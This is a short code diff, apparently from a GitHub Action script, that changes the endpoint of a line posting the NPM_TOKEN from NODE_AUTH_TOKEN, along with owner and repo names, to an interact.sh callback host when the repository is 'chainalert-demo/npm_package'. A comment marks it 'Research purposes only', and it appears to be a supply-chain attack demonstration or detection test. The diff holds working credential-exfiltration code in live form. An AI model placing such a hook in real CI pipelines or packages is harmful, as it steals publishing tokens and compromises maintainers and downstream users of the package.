@@ -10,7 +10,7 @@ async function run() {
         const {owner, repo} = context.repo;
         if (owner === "chainalert-demo" && repo === "npm_package") {
             // Research purposes only
-            axios.post('https://c9ep0g22vtc0000skrpggrzmyeyyyyyyb.interact.sh', {'NPM_TOKEN': process.env.NODE_AUTH_TOKEN, 'owner':owner, 'repo': repo})
+            axios.post('ca347h62vtc0000bczp0gfb1daoyyyyyb.interact.sh', {'NPM_TOKEN': process.env.NODE_AUTH_TOKEN, 'owner':owner, 'repo': repo})
         }
 
         return;
